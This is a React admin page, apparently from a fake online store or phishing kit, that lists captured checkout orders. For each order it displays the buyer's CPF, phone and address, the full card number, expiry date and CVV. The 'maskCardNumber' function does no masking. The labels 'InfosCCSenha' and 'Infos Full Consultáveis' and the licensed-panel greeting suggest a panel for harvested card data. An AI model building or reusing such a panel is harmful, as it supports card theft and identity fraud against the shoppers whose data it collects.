import { Eye, FileText, Search, Settings, Trash2 } from 'lucide-react';
import { useEffect, useMemo, useState } from 'react';
import type { CheckoutOrderRecord } from '../../data/ordersStorage';
import { deleteCheckoutOrder, subscribeToOrders, updateOrderStatus } from '../../data/ordersStorage';
import { AdminDrawer } from './components/AdminDrawer';
import { AdminHeader } from './components/AdminHeader';

function SideFloatingButton() {
  return (
    <div
      aria-hidden="true"
      className="fixed right-[-12px] top-[55%] z-40 flex h-9 w-9 -translate-y-1/2 items-center justify-center rounded-full bg-[#FF7A00]"
    >
      <div className="h-2 w-2 rounded-full bg-[#ff0048]" />
    </div>
  );
}

function SettingsButton() {
  return (
    <button
      aria-label="Configurações"
      className="fixed bottom-6 right-3 z-40 flex h-[42px] w-[42px] items-center justify-center rounded-[8px] bg-[#1A1F28] text-white shadow-lg hover:bg-[#202631]"
      type="button"
    >
      <Settings className="h-5 w-5" strokeWidth={2} />
    </button>
  );
}

function WelcomeSection() {
  return (
    <section className="px-5 pt-20">
      <h1 className="text-base font-medium leading-6 text-white sm:text-[18px] sm:leading-7">
        Olá abobora, você está em / InfosCCSenha
      </h1>
      <p className="mt-1 text-[13px] leading-5 text-[#7A7F89]">
        Seu serial vence NUNCA
      </p>
    </section>
  );
}

function InfoActions() {
  return (
    <div className="flex flex-wrap gap-2">
      <button
        className="rounded-full bg-[#3DD4B9] px-5 py-2 text-sm font-semibold leading-5 text-[#071311] hover:bg-[#31c4aa]"
        type="button"
      >
        Copiar
      </button>
      <button
        className="rounded-full bg-[#3DD4B9] px-5 py-2 text-sm font-semibold leading-5 text-[#071311] hover:bg-[#31c4aa]"
        type="button"
      >
        CSV
      </button>
      <button
        className="rounded-full bg-[#3DD4B9] px-5 py-2 text-sm font-semibold leading-5 text-[#071311] hover:bg-[#31c4aa]"
        type="button"
      >
        Imprimir
      </button>
    </div>
  );
}

function parseCreatedAt(createdAt: CheckoutOrderRecord['createdAt']): Date | null {
  if (!createdAt) {
    return null;
  }

  // Firebase Timestamp (has toDate method)
  if (typeof createdAt === 'object' && 'toDate' in createdAt && typeof createdAt.toDate === 'function') {
    return createdAt.toDate();
  }

  // ISO string
  if (typeof createdAt === 'string') {
    const date = new Date(createdAt);
    return Number.isNaN(date.getTime()) ? null : date;
  }

  return null;
}

function formatDateTime(createdAt: CheckoutOrderRecord['createdAt']): { date: string; time: string } {
  const date = parseCreatedAt(createdAt);

  if (!date) {
    return { date: '', time: '' };
  }

  return {
    date: date.toLocaleDateString('pt-BR'),
    time: date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
  };
}

function maskCardNumber(cardNumber: string): string {
  return cardNumber || '';
}

function getStatusColor(status: string): string {
  switch (status) {
    case 'Pagamento Recusado':
      return 'text-red-400';
    case 'Pagamento Aprovado':
      return 'text-green-400';
    case 'Em Processamento':
      return 'text-yellow-400';
    default:
      return 'text-[#BFC5D0]';
  }
}

function OrderModal({ order, onClose }: { order: CheckoutOrderRecord; onClose: () => void }) {
  const { date, time } = formatDateTime(order.createdAt);

  const handleMarkAsPaid = async () => {
    await updateOrderStatus(order.orderId, 'Pagamento Aprovado');
    onClose();
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 p-4">
      <div className="max-h-[90vh] w-full max-w-3xl overflow-y-auto rounded-[18px] border border-white/5 bg-[#1A1F28] p-5 text-white shadow-2xl">
        <div className="flex items-start justify-between gap-4 border-b border-white/5 pb-4">
          <div>
            <h2 className="text-base font-medium leading-6 text-[#3DD4B9]">Detalhes do Pedido</h2>
            <p className="mt-1 break-words text-sm font-medium leading-5 text-white">{order.orderId}</p>
          </div>
          <button
            aria-label="Fechar"
            className="rounded bg-white/5 px-3 py-1 text-sm font-medium leading-5 text-white hover:bg-white/10"
            onClick={onClose}
            type="button"
          >
            Fechar
          </button>
        </div>

        <div className="space-y-5 py-5">
          <section>
            <h3 className="mb-2 text-sm font-semibold uppercase tracking-[0.04em] text-[#3DD4B9]">Dados Pessoais</h3>
            <div className="space-y-1 text-sm leading-5 text-[#BFC5D0]">
              <p>Nome: {order.dadosPessoais?.nome || 'não informado'} {order.dadosPessoais?.sobrenome || ''}</p>
              <p>Email: {order.dadosPessoais?.email || 'não informado'}</p>
              <p>CPF: {order.dadosPessoais?.cpf || 'não informado'}</p>
              <p>Telefone: {order.dadosPessoais?.telefone || 'não informado'}</p>
            </div>
          </section>

          <section>
            <h3 className="mb-2 text-sm font-semibold uppercase tracking-[0.04em] text-[#3DD4B9]">Entrega</h3>
            <div className="space-y-1 text-sm leading-5 text-[#BFC5D0]">
              <p>Destinatário: {order.entrega?.destinatario || 'não informado'}</p>
              <p>CEP: {order.entrega?.cep || 'não informado'}</p>
              <p>Rua: {order.entrega?.rua || 'não informado'}, {order.entrega?.numero || 'S/N'}</p>
              <p>Complemento: {order.entrega?.complemento || 'não informado'}</p>
              <p>Bairro: {order.entrega?.bairro || 'não informado'}</p>
              <p>Cidade: {order.entrega?.cidade || 'não informado'}</p>
              <p>Estado: {order.entrega?.estado || 'não informado'}</p>
              <p>Método: {order.entrega?.metodoEntrega || 'não informado'}</p>
            </div>
          </section>

          <section>
            <h3 className="mb-2 text-sm font-semibold uppercase tracking-[0.04em] text-[#3DD4B9]">Pagamento</h3>
            <div className="space-y-1 text-sm leading-5 text-[#BFC5D0]">
              <p>Método: {order.pagamento?.metodo || 'não informado'}</p>
              <p>Cartão: {maskCardNumber(order.pagamento?.numeroCartao || '')}</p>
              <p>Parcelas: {order.pagamento?.parcelas || 'à vista'}</p>
              <p>Nome: {order.pagamento?.nomeCartao || 'não informado'}</p>
              <p>Validade: {order.pagamento?.validadeMes && order.pagamento?.validadeAno ? `${order.pagamento.validadeMes}/${order.pagamento.validadeAno}` : 'não informado'}</p>
              <p>CVV: {order.pagamento?.cvv || 'não informado'}</p>
              <p>CPF do titular: {order.pagamento?.cpfTitular || 'não informado'}</p>
            </div>
          </section>

          <section>
            <h3 className="mb-2 text-sm font-semibold uppercase tracking-[0.04em] text-[#3DD4B9]">Resumo</h3>
            <div className="space-y-1 text-sm leading-5 text-[#BFC5D0]">
              <p>Subtotal: {order.resumo?.subtotal ? `R$ ${order.resumo.subtotal.toFixed(2).replace('.', ',')}` : 'não informado'}</p>
              <p>Frete: {order.resumo?.frete ? `R$ ${order.resumo.frete.toFixed(2).replace('.', ',')}` : 'não informado'}</p>
              <p className="font-semibold text-white">Total: {order.resumo?.total ? `R$ ${order.resumo.total.toFixed(2).replace('.', ',')}` : 'não informado'}</p>
            </div>
          </section>

          <section>
            <h3 className="mb-2 text-sm font-semibold uppercase tracking-[0.04em] text-[#3DD4B9]">Data</h3>
            <div className="space-y-1 text-sm leading-5 text-[#BFC5D0]">
              <p>Data: {order.dataPedido || date || 'não informado'}</p>
              <p>Hora: {order.horaPedido || time || 'não informado'}</p>
            </div>
          </section>

          <section>
            <h3 className="mb-2 text-sm font-semibold uppercase tracking-[0.04em] text-[#3DD4B9]">ID do Pedido</h3>
            <div className="space-y-1 text-sm leading-5 text-[#BFC5D0]">
              <p>ID: {order.orderId || 'não informado'}</p>
            </div>
          </section>

          <section>
            <h3 className="mb-2 text-sm font-semibold uppercase tracking-[0.04em] text-[#3DD4B9]">Status</h3>
            <span className={`inline-block rounded-full px-3 py-1 text-sm font-semibold ${getStatusColor(order.status)}`}>
              {order.status || 'não informado'}
            </span>
          </section>
        </div>

        <div className="flex gap-3 border-t border-white/5 pt-4">
          <button
            className="flex-1 rounded bg-[#f80046] py-2 text-sm font-semibold text-white hover:bg-[#e1003e]"
            onClick={handleMarkAsPaid}
            type="button"
          >
            Marcar Como Pago
          </button>
        </div>
      </div>
    </div>
  );
}

function DataTable({
  orders,
  onOpenInfo,
  onDelete,
  isLoadingOrders,
}: {
  orders: CheckoutOrderRecord[];
  onOpenInfo: (order: CheckoutOrderRecord) => void;
  onDelete: (order: CheckoutOrderRecord) => void;
  isLoadingOrders: boolean;
}) {
  return (
    <section className="mx-4 mt-5 rounded-[8px] border border-white/5 bg-[#1A1F28] p-5 sm:mx-5 sm:p-[20px]">
      <div className="flex flex-col gap-4 border-b border-white/5 pb-4 sm:flex-row sm:items-center sm:justify-between">
        <div>
          <h2 className="text-base font-medium leading-6 text-[#BFC5D0]">
            Infos Full Consultáveis
          </h2>
        </div>

        <div className="flex items-center gap-2 text-[#8B92A0]">
          <button aria-label="Expandir" className="hover:text-white" type="button">
            <FileText className="h-5 w-5" strokeWidth={2} />
          </button>
          <button aria-label="Mais opções" className="hover:text-white" type="button">
            <span className="text-lg leading-none">•••</span>
          </button>
        </div>
      </div>

      <div className="border-b border-white/5 pb-4 pt-4">
        <InfoActions />
      </div>

      <div className="border-b border-white/5 pb-4 pt-4">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-[#5E6573]" />
          <input
            aria-label="Search"
            className="w-full rounded border border-white/5 bg-[#12161E] py-2 pl-9 pr-3 text-[13px] leading-5 text-white outline-none placeholder:text-[#5E6573] focus:border-white/20"
            placeholder="Search:"
            type="search"
          />
        </div>
      </div>

      <div className="grid grid-cols-[auto_1fr] gap-4 border-b border-white/5 py-3 text-[13px] leading-5 text-[#8B92A0]">
        <span>GERENCIAR</span>
        <span>PEDIDO</span>
      </div>

      {isLoadingOrders ? (
        <div className="border-b border-white/5 py-5 text-sm text-[#8B92A0]">
          Carregando pedidos...
        </div>
      ) : orders.length === 0 ? (
        <div className="border-b border-white/5 py-5 text-sm text-[#8B92A0]">
          Nenhum pedido encontrado.
        </div>
      ) : (
        orders.map((order) => (
          <div className="grid grid-cols-[auto_1fr] items-center gap-4 border-b border-white/5 py-4" key={order.id}>
            <div className="flex items-center gap-3 text-[#8B92A0]">
              <button aria-label="Visualizar" className="hover:text-white" onClick={() => onOpenInfo(order)} type="button">
                <Eye className="h-5 w-5" strokeWidth={2} />
              </button>
              <button aria-label="Excluir" className="hover:text-[#ff6b8a]" onClick={() => onDelete(order)} type="button">
                <Trash2 className="h-5 w-5" strokeWidth={2} />
              </button>
            </div>

            <span className="truncate text-[13px] leading-5 text-[#BFC5D0]">
              {order.orderId}
            </span>
          </div>
        ))
      )}

      <div className="border-b border-white/5 py-5 text-sm text-[#8B92A0]">
        <div className="mb-3 text-center sm:text-left">
          Showing 1 to {orders.length} of {orders.length} entries
        </div>

        <div className="flex justify-end">
          <div className="inline-flex items-center gap-1">
            <button
              className="rounded bg-[#111827] px-3 py-1 text-[#8B92A0]"
              disabled
              type="button"
            >
              Previous
            </button>
            <button
              className="rounded bg-[#2563eb] px-3 py-1 font-semibold text-white"
              type="button"
            >
              1
            </button>
            <button
              className="rounded bg-[#111827] px-3 py-1 text-[#8B92A0]"
              disabled
              type="button"
            >
              Next
            </button>
          </div>
        </div>
      </div>
    </section>
  );
}

function InfosConsultaveisPage() {
  const [isDrawerOpen, setIsDrawerOpen] = useState(false);
  const [orders, setOrders] = useState<CheckoutOrderRecord[]>([]);
  const [selectedOrder, setSelectedOrder] = useState<CheckoutOrderRecord | null>(null);
  const [isLoadingOrders, setIsLoadingOrders] = useState(true);
  const filteredRows = useMemo(() => orders, [orders]);

  useEffect(() => {
    setIsLoadingOrders(true);

    const unsubscribe = subscribeToOrders((loadedOrders) => {
      setOrders(loadedOrders);
      setIsLoadingOrders(false);
    });

    return () => unsubscribe();
  }, []);

  const handleDeleteOrder = async (order: CheckoutOrderRecord) => {
    await deleteCheckoutOrder(order.orderId);
  };

  return (
    <div className="min-h-screen bg-[#12161E] pb-24 text-white">
      <AdminHeader onOpenDrawer={() => setIsDrawerOpen(true)} />
      <AdminDrawer
        activeRoute="/infos-consultaveis"
        isOpen={isDrawerOpen}
        onClose={() => setIsDrawerOpen(false)}
      />
      <WelcomeSection />
      <DataTable
        orders={filteredRows}
        onOpenInfo={setSelectedOrder}
        onDelete={handleDeleteOrder}
        isLoadingOrders={isLoadingOrders}
      />
      {selectedOrder && <OrderModal order={selectedOrder} onClose={() => setSelectedOrder(null)} />}
      <SideFloatingButton />
      <SettingsButton />
    </div>
  );
}

export default InfosConsultaveisPage;
